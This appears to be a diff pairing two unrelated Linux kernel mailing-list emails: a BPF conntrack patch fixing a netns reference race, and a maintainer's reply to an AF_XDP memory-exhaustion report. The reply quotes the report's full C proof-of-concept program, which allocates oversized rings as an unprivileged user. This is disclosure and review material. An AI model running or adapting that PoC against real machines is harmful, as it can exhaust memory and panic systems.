@@ -1,218 +1,253 @@
-Received: from mail-pl1-f171.google.com (mail-pl1-f171.google.com [209.85.214.171])
+Received: from mail-pj2-f9.google.com (mail-pj2-f9.google.com [74.125.227.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8956947D95F
-	for <bpf@vger.kernel.org>; Wed, 29 Jul 2026 16:31:55 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.171
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DC9404C954A
+	for <bpf@vger.kernel.org>; Wed, 29 Jul 2026 16:38:46 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.137
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785342717; cv=none; b=ctNB031n/WJ2Q+wIL0Hrhp1+NI2ykv8sTfeCXAbBXAoyy7QrpCqv3SgPCWw8YsCpSickaB0ymObLoOcehijf806QbkWnzTc1OQJW/FQxGx7a6Ue4c83BHoqOhugfN2Y448+62PeeBxPPkFIdxBsqApksue3VMZ+PjW6yKGx9Rr0=
+	t=1785343130; cv=none; b=HnygwN9YDNgNJ+1fjHZZtPQoeAi3oB4HnLrQeQy8xJ/tPkFsRdh2Rk/TgMUfd2PDX6YvpBYUQZjqN45tz0MCez9rl5E6njhHM6KW7jZPKmhWdlr6jHtUP1kiHX49CocGo1nJbh0NgOc2Kg+rzhS1jZcL7AGk3a9oUWr9sXM0Yvo=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785342717; c=relaxed/simple;
-	bh=YX7xq17ZotAraFEouO18/SjlA5AtqpZW3D7IbWm/iNI=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=kPcjtORMItY0OEzB6PeK+FOfwfr0QH2BnzyRe4I2B82bggfpLz/5bTeH/5CP8HriJ+JfRbNGtWJytYjgRKUijupuaQAWRrHntmN7mLDppEhClykGPYw18EAtzxnsgm3AEMt6Jqmjr9osGmCnpf5VzWYE4mWlPcVdJxsm3MPWnJ0=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=Ir5njEj9; arc=none smtp.client-ip=209.85.214.171
+	s=arc-20240116; t=1785343130; c=relaxed/simple;
+	bh=o0NSRCyiPXXgriEdOwt8eGcwXFo+fSB818rHUmF8Oak=;
+	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
+	 Content-Type:Content-Disposition:In-Reply-To; b=Z4wl4iDEZm7Td8KxVIUs+R6bfXwvqqmuMmMO9pO4wuHWXDKLs5TbjALZGyfLGSP9aTmK1d60RmbeC1zR2FTio9PCtYxV6QVmNN1Xda7dHpgPbUkOQ/9hC77dm8WxAiU5sWZUmns8+f6BdmYDBhpX2iWD4TcyW4E/XU1jTtULRdU=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=qx2ziNkF; arc=none smtp.client-ip=74.125.227.137
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="Ir5njEj9"
-Received: by mail-pl1-f171.google.com with SMTP id d9443c01a7336-2d01548ac96so1340765ad.3
-        for <bpf@vger.kernel.org>; Wed, 29 Jul 2026 09:31:55 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="qx2ziNkF"
+Received: by mail-pj2-f9.google.com with SMTP id 98e67ed59e1d1-38eca9b7114so544491a91.1
+        for <bpf@vger.kernel.org>; Wed, 29 Jul 2026 09:38:46 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1785342715; x=1785947515; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=kEGJ1DAV4pFcJgYI6xWwOeKrc0EBFfRn/eUaXfgAG40=;
-        b=Ir5njEj9UfO7xLd1Ns2oEE0D08SnabHtLYw3LRVlk+89A5O8G1BlpBPjY+zjhBNT6G
-         1TCb700cYko1shRnVrkNxbzJkL30DETpzpm2gX8NA9Hrvi984zvgFBEqKXv29xWAUmcn
-         tCmseYdxai6vuTKMdxIadNUh/cTm8GOqhsyCLhXYXlIuIeSVrBiSVUI3Y7qvyz5vadvS
-         C1dsj3G9WOSijfVJEvmh+XdAFWzgyn9F6M5oAkp1OnkSIL+2kPm0HqNRO7uD04mo1VU4
-         9yjlLLrNikDvKIUP+TJfnxrHm3vBElGr9eloJz3Wj0JclzuQsZqa0WwF4SeIZ/T1w2Nc
-         4S3g==
+        d=gmail.com; s=20251104; t=1785343124; x=1785947924; darn=vger.kernel.org;
+        h=in-reply-to:content-disposition:content-type:mime-version
+         :references:message-id:subject:cc:to:from:date:from:to:cc:subject
+         :date:message-id:reply-to:content-type;
+        bh=5qSxttMWa0mJscjM1mfb0RauUUayXTalCzLP7th5DS4=;
+        b=qx2ziNkFgEyhf+BdxRI+f6g4aM9j0FvyAP5t7R1HDY01U3NgcNKLKr/nRi8I3jnOZd
+         Bewj2SBMFlKMT39rqkGy2UWHyROsCF3Da3vFj/pmYNC+3XFtPj54xTiOAVLuw/Gp/Nd/
+         N4XI2Vu0wKay17C43hdxBpNEpxJtFrLe1AfdhReCPHMP7cRawNXBhin3+w9I7N9dbqgW
+         mKWlCBAydJI8wa7YZuXiNDItOmhdgTvmRjGnoaTvk6dCDZR2P5gUvc1pF6trPPOL/OqU
+         IbnyqUte7JznkOrEhJKbrUnjx4aRgzG9TZa/at4GpS3YghMUEHLUeONgw+QpFWvMwIBJ
+         efSQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785342715; x=1785947515;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=kEGJ1DAV4pFcJgYI6xWwOeKrc0EBFfRn/eUaXfgAG40=;
-        b=OAw7gZke2zqrw/yD8qHr9hZyHIVwiuxanpI9VJnQsuAsIvn907X8vtG7JL3FG+QM96
-         tDXNjKQBveiES/ssb6trCUFuvpH1Sk40wouFKY1KXDSsG6nKpmxUHo0DMxZLDw3Uakf7
-         9BfiREE16iDPN2FBEKWrdLiJqz6/YVZ47kEC71L+ncLRjfH8C6wBxNeFKbUEwm8Gb3lp
-         z2vmQz7P5hysa/8HwLsFrdo1NXtu6NoIvJDZln/ZWJ0GBJ/ugmyuJkgKj3EQevg95w4K
-         1DtCXGgx9WwhWq8WZNZM9bs6mA5kYQD173Ytx7gibcx8YAsIfDakRY2YEuRK5kIzvD0P
-         rMoA==
-X-Forwarded-Encrypted: i=1; AHgh+Rr5/n7tUZRq1PuuZUax4eYaJaajuOnjTBsWhgLszkRy3KhcclhJuHkUueBV3lCTpqfiMig=@vger.kernel.org
-X-Gm-Message-State: AOJu0YzAvYqes1K9IzlGgsgsib5J5B7SZL+tkMX2A3lvnXUApYLCUCnP
-	xxO/ClSXly0Q5XSdH17Pqm5r/uGwkv17fLwyUPZ15YnasCgYynzSTA2X
-X-Gm-Gg: AR+sD12l4RgK4B21G/UHBKEQUK0UvMVo6yY2S7dNoSV1kzoOVhJG9V/xne1uhuesz9f
-	gPShsFzuCP/nI8caLq4pPTp43+kLeVx/U0Kd9XxcT5yTvUGXpZHIP1X2ljV6rGWlI/45PlL9N4u
-	99d5gsuBLcjwgbv0FAPuUHQJiuQ/AIXllF9cOciTms57XVZVNedSmWn1JyS9isUPSYvxsMdKbXc
-	IG9sWTgB0F49Kl4YzK9qDSfHkA2MYkExKWq2AVjaf2JrbsBn3zV1jG0+UUDJak9ilNn3zTtckPu
-	/ol5+evskGqSRY0EhDv6U+Ske/16qFBUwzwXGJSdKXJHiA1mS38CW1cWtfYBDRBVExZ3u4aodnj
-	OzH7GeX0oc2F7qjTWxgi0cBUt/L4rIR1jLOPQMZrkx3sOxqPKVQDPh+HfAC+jY7mhXG7uEXqynp
-	WY1NF1CvD8q9WtLEuFXreYHcCfk/JXrbpfOpzvWwybzEBzwOge++XPjMO/M07TX+AFAvwatX1AT
-	OqzQcWV18cZ/st/5noz1K9Lv4jnpL4VGXyj5NnNwhvtn2wFpOBXQTA=
-X-Received: by 2002:a17:902:d4ce:b0:2c9:b96a:2855 with SMTP id d9443c01a7336-2d01e844abemr75415205ad.0.1785342714500;
-        Wed, 29 Jul 2026 09:31:54 -0700 (PDT)
-Received: from localhost.localdomain (45.78.65.84.16clouds.com. [45.78.65.84])
-        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-31504cc73b6sm11245292eec.18.2026.07.29.09.31.49
+        d=1e100.net; s=20251104; t=1785343124; x=1785947924;
+        h=in-reply-to:content-disposition:content-type:mime-version
+         :references:message-id:subject:cc:to:from:date:x-gm-gg
+         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=5qSxttMWa0mJscjM1mfb0RauUUayXTalCzLP7th5DS4=;
+        b=UErZ4A7sXKQkn/ar0MBH9QbhbUdFAjh62uGlhe3r6ntlHwimNQNNPiXSS3z0cTP+FP
+         Iz8RkNfmsLtEUavA5Ijs1eAMj+DHYx5/6ERNY/c6Un5AKdAcaJdvYtEV1wmCDIcRXJt3
+         j+m6zH6DHhmfewyMvvdpcMp2aOe+Wh9kOQKrrWHrWcvjURUlegUZBYQWmzxvLSwrQVyh
+         OxjdVFS09fHBls8y636eglZDgysuZwnNiRt1EyUJv7ageGo9Mzmo746l54Ggyq8Sc4bk
+         fOnPFUkbszueEFHZ5d04v+ON3/amksfL/i+y94BTGUGwx5/eBZ7MYc/hTtxYhMy2oOVd
+         +7WQ==
+X-Forwarded-Encrypted: i=1; AHgh+RoW+1viQ2e7R3W6H3PfO3mZtRx3ujU9bCeu99DzNOF+CbLE/YvybR1p7SVnS/+hYToy0C4=@vger.kernel.org
+X-Gm-Message-State: AOJu0Yyh6BjbyoF2a02rsPuHcCuujlEpwexOGF276kNsnQgFoi3Cgd7k
+	Yv+XwOhpR1D9KOIExie6ddbnCxGQJqKyNlo2MpSc8czu+aSLx3X7eDyV
+X-Gm-Gg: AR+sD11d4Dlj9Rb8GDl6HEWV9VMjc3CBZIQf7p19b/U/eDnc/FaS+CJa+KhTTMxR2TD
+	efrwgWpNNW/FYPjm0WQ0sIe2Tenv1/YLmFppC4sAifXhb4aMmz4D8TcweF0Vq/02s+H1SquUVY2
+	DyTISGJVJU8RbHukdzWhQ2RCH6i+GRv6lLXfb+SAZhKsVR9x6ijr1fNIiw+/UTxwtBEl+ByyKa2
+	AU86sWnqsSvZ/vohX06RedV1jMgTmEjdS0xVqw93JNU0KqHltQYeDoVxTI0UFkTjsIzdLS/JVOE
+	CpAmDF3sWedIuWpUUHpQmBNivXckLYEDP0ZLEgI/D4MXHBsHii/9/IkIDPIDCV/EH2Oy1TXcM3g
+	hzWUqiYztmAjlDmA9HDtzkXbzcx7GR/7Zq6rww0rOc+PyVbiVrkkW2MndcGWWVTpTOgtkMUxARK
+	IuSsly7FVEkDB42bTdayLy08emDwmnYc6GIbQk3Zh2f03babIk1yMTtQQ/6pwCyn3krA==
+X-Received: by 2002:a17:90b:1645:b0:387:e0bb:57f8 with SMTP id 98e67ed59e1d1-38f6a4d6731mr7361780a91.41.1785343124501;
+        Wed, 29 Jul 2026 09:38:44 -0700 (PDT)
+Received: from localhost ([2a03:2880:9ff:72::])
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-31504cc9dffsm12785644eec.14.2026.07.29.09.38.43
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Wed, 29 Jul 2026 09:31:53 -0700 (PDT)
-From: Chengfeng Ye <nicoyip.dev@gmail.com>
-To: Pablo Neira Ayuso <pablo@netfilter.org>,
-	Florian Westphal <fw@strlen.de>,
-	Phil Sutter <phil@nwl.cc>,
-	"David S. Miller" <davem@davemloft.net>,
-	Eric Dumazet <edumazet@google.com>,
-	Jakub Kicinski <kuba@kernel.org>,
-	Paolo Abeni <pabeni@redhat.com>,
-	Simon Horman <horms@kernel.org>,
-	Alexei Starovoitov <ast@kernel.org>,
-	Daniel Borkmann <daniel@iogearbox.net>,
-	Jesper Dangaard Brouer <hawk@kernel.org>,
-	John Fastabend <john.fastabend@gmail.com>,
-	Stanislav Fomichev <sdf@fomichev.me>,
-	Kumar Kartikeya Dwivedi <memxor@gmail.com>,
-	Lorenzo Bianconi <lorenzo@kernel.org>
-Cc: netfilter-devel@vger.kernel.org,
-	coreteam@netfilter.org,
-	netdev@vger.kernel.org,
-	linux-kernel@vger.kernel.org,
-	bpf@vger.kernel.org,
-	Chengfeng Ye <nicoyip.dev@gmail.com>
-Subject: [PATCH bpf] bpf: Fix netns reference imbalance in conntrack kfuncs
-Date: Thu, 30 Jul 2026 00:31:41 +0800
-Message-ID: <20260729163141.213611-1-nicoyip.dev@gmail.com>
-X-Mailer: git-send-email 2.43.0
+        Wed, 29 Jul 2026 09:38:43 -0700 (PDT)
+Date: Wed, 29 Jul 2026 09:37:54 -0700
+From: Stanislav Fomichev <sdf.kernel@gmail.com>
+To: Zihan Xi <zihanx@nebusec.ai>
+Cc: netdev@vger.kernel.org, bpf@vger.kernel.org, magnus.karlsson@intel.com,
+	maciej.fijalkowski@intel.com, sdf@fomichev.me, davem@davemloft.net,
+	edumazet@google.com, pabeni@redhat.com, horms@kernel.org,
+	ast@kernel.org, daniel@iogearbox.net, hawk@kernel.org,
+	john.fastabend@gmail.com, vega@nebusec.ai
+Subject: Re: [PATCH net 0/1] xsk: prevent AF_XDP ring resource exhaustion
+Message-ID: <amosYv8kWGJmmOHV@devvm16445.scu0.facebook.com>
+References: <cover.1785313094.git.zihanx@nebusec.ai>
 Precedence: bulk
 X-Mailing-List: bpf@vger.kernel.org
 List-Id: <bpf.vger.kernel.org>
 List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
+Content-Type: text/plain; charset=utf-8
+Content-Disposition: inline
+In-Reply-To: <cover.1785313094.git.zihanx@nebusec.ai>
 
-The opts argument of the BPF conntrack kfuncs can point to a shared map
-value.  __bpf_nf_ct_lookup() and __bpf_nf_ct_alloc_entry() read
-opts->netns_id separately when acquiring and releasing the network
-namespace reference.
+On 07/29, Zihan Xi wrote:
+> Hi Linux kernel maintainers,
+> 
+> We found and validated a issue in net/xdp/xsk_queue.c. The bug is reachable by a
+> non-root user via user and net namespace.
+> We've tested it, and it should not affect any other functionality.
+> 
+> We will provide detailed information about the bug
+> in this email, along with a PoC to trigger it.
+> 
+> ---- details below ----
+> 
+> Bug details:
+> 
+> AF_XDP sockets allow user space to allocate RX, TX, UMEM fill and UMEM
+> completion rings with setsockopt().  xskq_create() only validates that the
+> entry count is non-zero and a power of two before computing the ring size and
+> calling vmalloc_user().  The allocation is not charged against the socket
+> optmem limit.  The underlying root cause dates back to the original shared
+> xskq_create() helper used for UMEM fill rings, while later RX-ring support and
+> the vmalloc-based ring allocation path only made the same bug easier to reach
+> and more effective at pinning memory before bind or packet I/O.
+> 
+> The fix charges the page-aligned ring size to sk_omem_alloc before the
+> vmalloc_user() call and bounds the charge by the namespace optmem limit.  The
+> charge path uses an atomic cmpxchg loop, rather than adding first and rolling
+> back later, so concurrent allocations cannot race past the limit and the
+> signed sk_omem_alloc counter cannot overflow and wrap below the limit.
+> 
+> UMEM fill and completion queues can move from the socket to the AF_XDP buffer
+> pool and be destroyed after socket release.  The queue therefore keeps a
+> socket reference for safe uncharging.  To avoid a release cycle where the
+> queue reference prevents the socket destructor that used to release the pool,
+> the socket now drops its pool and UMEM references from xsk_release() before
+> the final socket put; xsk_destruct() keeps the same helper as a fallback.
+> 
+> This reproducer does not use packetdrill because the trigger is the AF_XDP
+> setsockopt() ring allocation path, not a packet sequence or protocol state
+> transition that packetdrill can express.
+> 
+> Reproducer:
+> 
+>     gcc -O2 -static -o poc poc.c
+>     unshare -Urn ./poc
+> 
+> We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+> 
+> ------BEGIN poc.c------
+> #define _GNU_SOURCE
+> #include <errno.h>
+> #include <linux/if_xdp.h>
+> #include <netinet/in.h>
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <sys/resource.h>
+> #include <sys/socket.h>
+> #include <sys/sysinfo.h>
+> #include <unistd.h>
+> 
+> static void print_meminfo(const char *tag)
+> {
+> 	struct sysinfo info;
+> 
+> 	if (sysinfo(&info) == 0) {
+> 		unsigned long long total = (unsigned long long)info.totalram * info.mem_unit;
+> 		unsigned long long free = (unsigned long long)info.freeram * info.mem_unit;
+> 		unsigned long long avail = (unsigned long long)info.bufferram * info.mem_unit;
+> 
+> 		fprintf(stderr,
+> 			"%s: total=%llu MiB free=%llu MiB buff=%llu MiB\n",
+> 			tag, total >> 20, free >> 20, avail >> 20);
+> 	}
+> }
+> 
+> static int set_ring(int fd, int optname, unsigned int entries, const char *name)
+> {
+> 	int ret;
+> 
+> 	ret = setsockopt(fd, SOL_XDP, optname, &entries, sizeof(entries));
+> 	if (ret) {
+> 		fprintf(stderr, "setsockopt(%s, %u) failed: %s\n",
+> 			name, entries, strerror(errno));
+> 		return -1;
+> 	}
+> 
+> 	fprintf(stderr, "allocated %s ring with %u entries on fd=%d\n",
+> 		name, entries, fd);
+> 	return 0;
+> }
+> 
+> int main(int argc, char **argv)
+> {
+> 	static const struct {
+> 		int optname;
+> 		const char *name;
+> 	} rings[] = {
+> 		{ XDP_RX_RING, "XDP_RX_RING" },
+> 		{ XDP_TX_RING, "XDP_TX_RING" },
+> 		{ XDP_UMEM_FILL_RING, "XDP_UMEM_FILL_RING" },
+> 		{ XDP_UMEM_COMPLETION_RING, "XDP_UMEM_COMPLETION_RING" },
+> 	};
+> 	unsigned int entries = 1U << 25;
+> 	int nsockets = 8;
+> 	int *fds;
+> 	int i, j;
+> 
+> 	if (argc > 1)
+> 		entries = strtoul(argv[1], NULL, 0);
+> 	if (argc > 2)
+> 		nsockets = atoi(argv[2]);
+> 	if (!entries || !nsockets) {
+> 		fprintf(stderr, "usage: %s [entries power-of-two] [socket_count]\n",
+> 			argv[0]);
+> 		return 1;
+> 	}
+> 
+> 	fds = calloc(nsockets, sizeof(*fds));
+> 	if (!fds) {
+> 		perror("calloc");
+> 		return 1;
+> 	}
+> 
+> 	fprintf(stderr,
+> 		"AF_XDP ring exhaustion PoC: entries=%u sockets=%d pid=%d\n",
+> 		entries, nsockets, getpid());
+> 	print_meminfo("before");
+> 
+> 	for (i = 0; i < nsockets; i++) {
+> 		fds[i] = socket(AF_XDP, SOCK_RAW, 0);
+> 		if (fds[i] < 0) {
+> 			fprintf(stderr, "socket(AF_XDP) failed at index %d: %s\n",
+> 				i, strerror(errno));
+> 			break;
+> 		}
+> 
+> 		fprintf(stderr, "opened AF_XDP socket %d fd=%d\n", i, fds[i]);
+> 		for (j = 0; j < (int)(sizeof(rings) / sizeof(rings[0])); j++) {
+> 			if (set_ring(fds[i], rings[j].optname, entries, rings[j].name))
+> 				goto out;
+> 			print_meminfo(rings[j].name);
+> 		}
+> 	}
+> 
+> out:
+> 	fprintf(stderr, "holding allocations open; press Ctrl-C or wait\n");
+> 	sleep(600);
+> 
+> 	for (i = 0; i < nsockets; i++) {
+> 		if (fds[i] >= 0)
+> 			close(fds[i]);
+> 	}
+> 	free(fds);
+> 	return 0;
+> }
+> ------END poc.c--------
+> 
+> ----BEGIN crash log----
 
-The reference imbalance can occur as follows:
+[..]
 
-  CPU 0                                  CPU 1
-  read opts->netns_id (-1)
-  skip get_net_ns_by_id()
-                                         write opts->netns_id (id)
-  read opts->netns_id (id)
-  put_net(net) /* no matching get */
+> [  112.547501][  T953] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
 
-The reverse transition leaks the reference.  Repeating the unmatched put
-can destroy a live namespace and crash later users.
+Isn't it all working as intended? The userspace requests too much, we hit oom.
+Since you seem to have "system-wide panic_on_oom is enabled" your kernel
+panics.
 
-The kernel reported:
-
-  Oops: general protection fault, probably for non-canonical address
-  KASAN: null-ptr-deref in range [0x00000000000000e8-0x00000000000000ef]
-  RIP: 0010:bpf_prog_test_run_xdp+0x52c/0x1700
-  Call Trace:
-   __sys_bpf+0x1662/0x50c0
-   __x64_sys_bpf+0x73/0xb0
-   do_syscall_64+0xf9/0x540
-   entry_SYSCALL_64_after_hwframe+0x77/0x7f
-  Kernel panic - not syncing: Fatal exception
-
-Read netns_id once with READ_ONCE() and use that value for validation
-and the matching get/put pair.  Each invocation then consistently uses
-either the calling namespace or a referenced namespace.
-
-Fixes: aed8ee7feb44 ("net: netfilter: Deduplicate code in bpf_{xdp,skb}_ct_lookup")
-Fixes: d7e79c97c00c ("net: netfilter: Add kfuncs to allocate and insert CT")
-Signed-off-by: Chengfeng Ye <nicoyip.dev@gmail.com>
----
-Please queue this fix for stable kernels.
-
- net/netfilter/nf_conntrack_bpf.c | 20 ++++++++++++--------
- 1 file changed, 12 insertions(+), 8 deletions(-)
-
-diff --git a/net/netfilter/nf_conntrack_bpf.c b/net/netfilter/nf_conntrack_bpf.c
-index f98d1d4b42c3..8b540846f299 100644
---- a/net/netfilter/nf_conntrack_bpf.c
-+++ b/net/netfilter/nf_conntrack_bpf.c
-@@ -122,6 +122,7 @@ __bpf_nf_ct_alloc_entry(struct net *net, struct bpf_sock_tuple *bpf_tuple,
- 	struct nf_conntrack_tuple otuple, rtuple;
- 	struct nf_conntrack_zone ct_zone;
- 	struct nf_conn *ct;
-+	s32 netns_id;
- 	int err;
- 
- 	if (!(opts_len == NF_BPF_CT_OPTS_SZ || opts_len == 12))
-@@ -134,7 +135,8 @@ __bpf_nf_ct_alloc_entry(struct net *net, struct bpf_sock_tuple *bpf_tuple,
- 			return ERR_PTR(-EINVAL);
- 	}
- 
--	if (unlikely(opts->netns_id < BPF_F_CURRENT_NETNS))
-+	netns_id = READ_ONCE(opts->netns_id);
-+	if (unlikely(netns_id < BPF_F_CURRENT_NETNS))
- 		return ERR_PTR(-EINVAL);
- 
- 	err = bpf_nf_ct_tuple_parse(bpf_tuple, tuple_len, opts->l4proto,
-@@ -147,8 +149,8 @@ __bpf_nf_ct_alloc_entry(struct net *net, struct bpf_sock_tuple *bpf_tuple,
- 	if (err < 0)
- 		return ERR_PTR(err);
- 
--	if (opts->netns_id >= 0) {
--		net = get_net_ns_by_id(net, opts->netns_id);
-+	if (netns_id >= 0) {
-+		net = get_net_ns_by_id(net, netns_id);
- 		if (unlikely(!net))
- 			return ERR_PTR(-ENONET);
- 	}
-@@ -171,7 +173,7 @@ __bpf_nf_ct_alloc_entry(struct net *net, struct bpf_sock_tuple *bpf_tuple,
- 	__nf_ct_set_timeout(ct, timeout * HZ);
- 
- out:
--	if (opts->netns_id >= 0)
-+	if (netns_id >= 0)
- 		put_net(net);
- 
- 	return ct;
-@@ -186,6 +188,7 @@ static struct nf_conn *__bpf_nf_ct_lookup(struct net *net,
- 	struct nf_conntrack_tuple tuple;
- 	struct nf_conntrack_zone ct_zone;
- 	struct nf_conn *ct;
-+	s32 netns_id;
- 	int err;
- 
- 	if (!opts || !bpf_tuple)
-@@ -201,7 +204,8 @@ static struct nf_conn *__bpf_nf_ct_lookup(struct net *net,
- 	}
- 	if (unlikely(opts->l4proto != IPPROTO_TCP && opts->l4proto != IPPROTO_UDP))
- 		return ERR_PTR(-EPROTO);
--	if (unlikely(opts->netns_id < BPF_F_CURRENT_NETNS))
-+	netns_id = READ_ONCE(opts->netns_id);
-+	if (unlikely(netns_id < BPF_F_CURRENT_NETNS))
- 		return ERR_PTR(-EINVAL);
- 
- 	err = bpf_nf_ct_tuple_parse(bpf_tuple, tuple_len, opts->l4proto,
-@@ -209,8 +213,8 @@ static struct nf_conn *__bpf_nf_ct_lookup(struct net *net,
- 	if (err < 0)
- 		return ERR_PTR(err);
- 
--	if (opts->netns_id >= 0) {
--		net = get_net_ns_by_id(net, opts->netns_id);
-+	if (netns_id >= 0) {
-+		net = get_net_ns_by_id(net, netns_id);
- 		if (unlikely(!net))
- 			return ERR_PTR(-ENONET);
- 	}
-@@ -225,7 +229,7 @@ static struct nf_conn *__bpf_nf_ct_lookup(struct net *net,
- 	}
- 
- 	hash = nf_conntrack_find_get(net, &ct_zone, &tuple);
--	if (opts->netns_id >= 0)
-+	if (netns_id >= 0)
- 		put_net(net);
- 	if (!hash)
- 		return ERR_PTR(-ENOENT);
--- 
-2.43.0
-
+I also looked at the fix and a bit confused about why you picked sysctl_optmem_max
+as a limit. I believe there are better mechanisms (memcg) to limit these
+types of allocations? (and they work by default, no need for any code
+changes)
